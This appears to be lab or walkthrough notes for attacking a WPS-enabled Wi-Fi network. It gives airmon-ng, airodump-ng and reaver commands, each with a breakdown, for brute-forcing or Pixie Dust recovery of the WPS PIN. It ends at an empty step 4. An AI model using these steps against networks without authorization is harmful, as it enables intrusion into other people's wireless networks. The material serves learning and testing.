# WPS network

## Tools

- [airmon-ng](https://linux.die.net/man/1/airmon-ng)
- [airodump-ng](https://linux.die.net/man/1/airodump-ng)
- [wpa_supplicant](https://linux.die.net/man/8/wpa_supplicant)
- [reaver](https://man.archlinux.org/man/reaver.1.en)

## Reconnaissance

1. Set the `wlan2` interface into monitor mode

```bash
sudo airmon-ng start wlan2
```

> Note: Do not run `airmon-ng check kill` as it will kill important processes required to run was

2. Conduct reconnaissance using the `wlan2mon` interface to find the target open network

```bash
sudo airodump-ng wlan2mon --band abg --wps --manufacturer
```

Here is a breakdown of the above command
```bash
sudo               # Run the command as `root`
  airodump-ng      # The program we want to run
    wlan2mon       # The wireless interface
    --band abg     # Hop to channels in the a, b, and g frequency bands
    --wps          # List Wireless Protected Setup (WPS) information
    --manufacturer # Display the manufacturer of devices (based on their OUI)
```

3. Use reaver to attack the wps network

```bash
sudo reaver -i wlan2mon -b <bssid> -v
```

Reaver is a tool for abusing common wps networks detailed [here](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf). It is used mainly to conduct a bruteforce or a PixieWPS attack.
PixieWPS is an offline attack that involves bruteforcing prng flaws of some common vendors.

Here is a breakdown of the reaver command:

```bash
sudo            # Runs the command as root
  reaver        # Name of the program being run
    -i wlan2mon # Sets the interface to conduct the attack from
    -b <bssid>  # Sets the target bssid
    -vv         # Turns on verbose mode so you can see the attempts
```

4. 
